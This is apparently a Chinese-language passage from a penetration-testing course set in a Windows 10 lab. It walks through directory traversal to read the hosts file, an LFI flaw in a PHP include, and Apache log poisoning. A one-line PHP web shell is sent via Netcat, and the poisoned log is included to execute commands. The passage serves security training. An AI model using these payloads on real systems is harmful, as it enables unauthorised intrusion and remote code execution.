

既然我们知道应用程序运行在 Windows 系统上，让我们更新我们的 payload 以针对 Windows **hosts** 文件。这是一个在 Windows 系统上很有用的目标文件，因为它可靠且任何用户都可以访问。

让我们将参数值更改为 `c:\windows\system32\drivers\etc\hosts` 并提交该 URL：

```
http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
```

*列表 294 - 更新 URL 以指向 Windows hosts 文件*

在浏览器中提交此 URL 后，页面包含了 **hosts** 文件的内容：

![](img/ec25e59d75726b7041242a56d3376832_312_0.png)

很好。看起来这个目录遍历漏洞允许我们读取任何类型的文件，包括 Web 根目录之外的文件。

## 9.4.3.2 练习

1. 利用目录遍历漏洞读取你的 Windows 10 实验机器上的任意文件。

## 9.4.4 文件包含漏洞

与仅显示文件内容的目录遍历不同，文件包含[275]漏洞允许攻击者将文件包含到应用程序正在运行的代码中。

为了实际利用文件包含漏洞，我们不仅需要能够执行代码，还需要能够将我们的 shell payload 写入某个位置。

本地文件包含（LFI）发生在被包含的文件从同一 Web 服务器加载时。远程文件包含（RFI）发生在文件从外部源加载时。这些漏洞常见于 PHP 应用程序，但也可能出现在其他编程语言中。

这些漏洞的利用取决于应用程序所使用的编程语言以及服务器配置。在 PHP 的情况下，语言运行时版本和 Web 服务器配置（特别是 **php.ini** 中的值，如 *register_globals* 和 *allow_url_wrappers*）在利用这些漏洞方面会产生相当大的影响。

> *Windows 10 实验机器上的 php.ini 文件位于 C:\xampp\php\php.ini。在对文件进行任何更改之前，请考虑先进行备份。*

请注意，目录遍历漏洞通常与 LFI 结合使用，特别是用于指定 LFI payload 中使用的文件。

### 9.4.4.1 识别文件包含漏洞

文件包含可以像目录遍历那样被发现。我们必须找到可以操纵的参数，并尝试使用它们加载任意文件。然而，文件包含更进一步，因为我们要尝试在应用程序内执行文件的内容。

我们还应该检查这些参数，看它们是否容易受到远程包含（RFI）的影响，方法是将其值更改为 URL 而不是本地路径。由于现代 PHP 版本的默认配置禁用了远程 URL 包含（这是我们执行远程代码所需的关键功能），因此我们不太可能找到 RFI 漏洞。但是，我们仍应测试 RFI，因为它们通常比 LFI 更容易利用。我们可以像处理 XSS 那样使用 Netcat、Apache 或 Python 来处理请求。我们可能需要尝试在不同的端口上托管我们的 payload，因为目标服务器发起的任何远程连接都可能受到内部防火墙或路由规则的限制。可能需要一些尝试和错误。

### 9.4.4.2 利用本地文件包含 (LFI)

让我们回到 Windows 10 实验机器上的示例应用程序。我们将接着之前的目录遍历攻击继续，查看 **menu.php** 的源代码以澄清我们要处理的内容：

```php
37 <?php
38     $file = $_GET["file"];
39     include $file; ?>
```

*列表 295 - 来自 menu.php 的代码摘录*

应用程序从请求查询字符串中读取 *file* 参数，然后使用该值与 *include*[276] 语句。这意味着应用程序将执行指定文件内的任何 PHP 代码。如果应用程序使用 *fread* 打开文件并使用 *echo* 显示内容，那么文件中的任何代码都将被显示而不是执行。

如果我们能够以某种方式将 PHP 代码写入本地文件，我们可能能够将此漏洞升级为远程代码执行。既然我们无法向服务器上传文件，我们有什么选择？

### 9.4.4.3 污染日志文件

我们尝试向服务器注入代码的一种方法是通过日志文件投毒。大多数应用程序服务器都会记录所有请求的 URL。我们可以利用这一点，提交一个包含 PHP 代码的请求。一旦请求被记录在日志中，我们就可以在 LFI payload 中使用该日志文件。

本模块中使用的工具，尤其是 Dirb，可能会在 Apache 日志文件中产生大量噪音。如果日志文件相对干净，本节的后续步骤将更易于查看和理解。我们将使用 Windows 10 客户端上的 Documents\clear\_logs.ps1 脚本来清理 Apache 日志文件的内容。

我们可以使用 **\-ExecutionPolicy Bypass** 临时允许未签名脚本，并使用 **\-File clear\_logs.ps1** 指定要执行的脚本：

```powershell
C:\Users\admin\Documents> powershell -ExecutionPolicy Bypass -File clear_logs.ps1
```

*列表 296 - 运行 PS1 脚本以清除 Apache 日志文件*

接下来，让我们使用 Netcat 连接到端口 80 上的 Windows 10 实验机器，并发送一个有趣的 payload。让我们解析该 payload 的各个组成部分。

首先，请注意整个 payload 是用 PHP 编写的：它以 `<?php` 开头，以 `?>` 结束。PHP payload 的主体是一个简单的 `echo` 命令，它将向页面打印输出。该输出首先被包裹在 `pre` HTML 标签中，这会保留函数调用结果中的任何换行符或格式。接下来是函数调用本身，`shell_exec`，它将执行操作系统命令。最后，操作系统命令通过 `$_GET['cmd']` 从 GET 请求的 `"cmd"` 参数中获取。这一行 PHP 允许我们通过查询字符串指定一个操作系统命令，并在浏览器中输出结果。

让我们现在发送该 payload：

```bash
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>' ?>

HTTP/1.1 400 Bad Request
```

*列表 297 - 使用 Netcat 发送 PHP payload*

尽管出现了“Bad Request”[277] 错误（因为我们要发送的不是有效的 HTTP 请求），我们可以通过检查 Windows 10 实验机器上的 Apache 日志文件来验证请求已提交。

我们可以通过打开 C:\xampp\apache\logs\access.log 或使用 XAMPP 控制面板来查看这些日志。

我们的 payload 应该位于日志文件的末尾附近：

```text
10.11.0.4 - - [30/Nov/2019:13:55:12 -0500] "GET /css/bootstrap.min.css HTTP/1.1" 200 155758 "http://10.11.0.22/menu.php?file=\\Windows\\System32\\drivers\\etc\\hosts" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.11.0.4 - - [30/Nov/2019:13:58:07 -0500] "GET /tacotruick.php HTTP/1.1" 200 1889 "http://10.11.0.22/menu.php?file=/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.11.0.4 - - [30/Nov/2019:14:01:41 -0500] "GET \"<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>' ?>\" HTTP/1.1" 400 981 "-" "-"
```

*列表 298 - Apache access.log 文件*

由于我们的 payload 已被记录在日志中，我们可以尝试执行 LFI。

### 9.4.4.4 LFI 代码执行

接下来，我们将使用 LFI 漏洞包含包含我们 PHP payload 的 Apache **access.log** 文件。我们知道应用程序使用了 *include* 语句，因此被包含文件的内容将作为 PHP 代码执行。

我们将构建一个 URL，其中包含日志的位置以及我们要执行的命令（`ipconfig`），该命令作为 `cmd` 参数的值发送。

```
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

*列表 299 - 使用被污染的日志文件*

一旦将 URL 发送到 Web 服务器，输出应该类似于以下内容：

![](img/ec25e59d75726b7041242a56d3376832_315_0.png)

如果一切按预期工作，页面底部应包含 `ipconfig` 的输出。

[275] (Wikipedia, 2019), https://en.wikipedia.org/wiki/File_inclusion_vulnerability
[276] (Wikipedia, 2019), https://en.wikipedia.org/wiki/File_inclusion_vulnerability
[277] (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400

